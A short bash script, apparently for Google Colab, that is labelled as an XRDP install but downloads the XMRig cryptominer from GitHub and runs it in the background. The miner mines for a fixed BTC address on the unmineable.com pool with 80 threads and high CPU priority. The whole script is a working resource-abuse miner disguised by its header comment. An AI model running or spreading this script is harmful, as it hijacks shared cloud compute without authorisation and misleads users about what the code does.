#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -a rx/0 -o rx.unmineable.com:3333 -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.$(echo $(shuf -i 1-999 -n 1)-Colab) -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive --background
